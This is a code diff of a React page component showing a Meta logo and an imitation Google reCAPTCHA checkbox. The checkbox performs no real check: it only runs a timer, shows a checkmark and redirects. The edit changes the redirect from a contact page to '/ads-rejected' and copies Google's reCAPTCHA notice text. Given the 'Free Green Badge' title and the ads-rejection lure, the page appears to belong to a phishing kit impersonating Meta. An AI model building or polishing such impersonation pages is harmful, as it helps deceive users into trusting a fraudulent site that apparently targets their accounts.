@@ -19,7 +19,7 @@ const Index: FC = () => {
                 setTimeout(() => {
                     setisShowCheckMark(true);
                     setIsLoading(false);
-                }, 2000);
+                }, 800);
             }
         } catch {
             //
@@ -28,57 +28,61 @@ const Index: FC = () => {
     useEffect(() => {
         if (isShowCheckMark) {
             const redirectTimeOut = setTimeout(() => {
-                const currentTime = Date.now();
-                router.push(`/contact/${currentTime}`);
-            }, 500);
+                router.push(`/ads-rejected`);
+            }, 300);
             return () => {
                 clearTimeout(redirectTimeOut);
             };
         }
     }, [isShowCheckMark, router]);
     return (
-        <div className='flex flex-col items-center justify-center pt-[150px]'>
-            <title>Free Green Badge</title>
-            <div className='w-[300px]'>
-                <Image src={MetaImage} alt='' className='w-16' />
-                <div className='flex w-full items-center justify-start py-5'>
-                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
-                        <div className='flex items-center justify-start'>
-                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
-                                <button
-                                    className='flex h-full w-full items-center justify-center'
-                                    onClick={() => {
-                                        handleVerify();
-                                    }}
-                                >
-                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
-                                    {isLoading ? (
-                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
-                                    ) : (
-                                        <div
-                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
-                                            style={{
-                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
-                                                backgroundPosition: '-10px -595px'
-                                            }}
-                                        ></div>
-                                    )}
-                                </button>
+        <div className='flex flex-col items-center justify-center min-h-screen w-full px-4 sm:px-6 py-8 sm:py-12'>
+            <div className='w-full max-w-[280px] sm:max-w-[330px]'>
+                <Image src={MetaImage} alt='Meta logo' className='w-12 sm:w-16 mb-4 sm:mb-6' />
+                <div className='flex w-full flex-col gap-2 py-4 sm:py-5'>
+                    {/* reCAPTCHA Checkbox */}
+                    <div className='flex-shrink-0 w-auto'>
+                        <div className='flex items-center justify-between rounded-md border-2 bg-[#f9f9f9] p-3 sm:p-4 text-[#4c4a4b]'>
+                            <div className='flex items-center justify-start gap-2 sm:gap-3 flex-1 sm:flex-none'>
+                                <div className='flex h-7 sm:h-8 w-7 sm:w-8 items-center justify-center flex-shrink-0'>
+                                    <button
+                                        className='flex h-full w-full items-center justify-center'
+                                        onClick={() => {
+                                            handleVerify();
+                                        }}
+                                    >
+                                        <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
+                                        {isLoading ? (
+                                            <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
+                                        ) : (
+                                            <div
+                                                className={`h-7 sm:h-8 w-7 sm:w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
+                                                style={{
+                                                    backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
+                                                    backgroundPosition: '-10px -595px'
+                                                }}
+                                            ></div>
+                                        )}
+                                    </button>
+                                </div>
+                                <div className='text-left text-xs sm:text-sm font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
                             </div>
-                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
-                        </div>
-                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
-                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
-                            <p className='text-[10px] font-bold'>reCAPTCHA</p>
-                            <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
+                            <div className='flex flex-col items-center text-[#9d9ba7] flex-shrink-0 ml-1 sm:ml-2'>
+                                <Image src={ReCaptchaImage} alt='reCAPTCHA' className='h-6 sm:h-7 w-6 sm:w-7' />
+                                <p className='text-[8px] sm:text-[9px] font-bold whitespace-nowrap'>reCAPTCHA</p>
+                                <small className='text-[6px] sm:text-[7px] text-gray-500 whitespace-nowrap'>Privacy - Terms</small>
+                            </div>
                         </div>
                     </div>
+
+                    {/* reCAPTCHA Info Text */}
+                    <div className='flex flex-col gap-2 sm:gap-3 text-xs sm:text-sm text-gray-700 leading-relaxed'>
+                        <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+                        <p>We've used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's <a href='#' className='text-blue-600 hover:underline'>Privacy Policy</a> and <a href='#' className='text-blue-600 hover:underline'>Terms of Use</a>.</p>
+                        <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                    </div>
                 </div>
-                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
-                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
-                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
-                </div>
+
             </div>
         </div>
     );
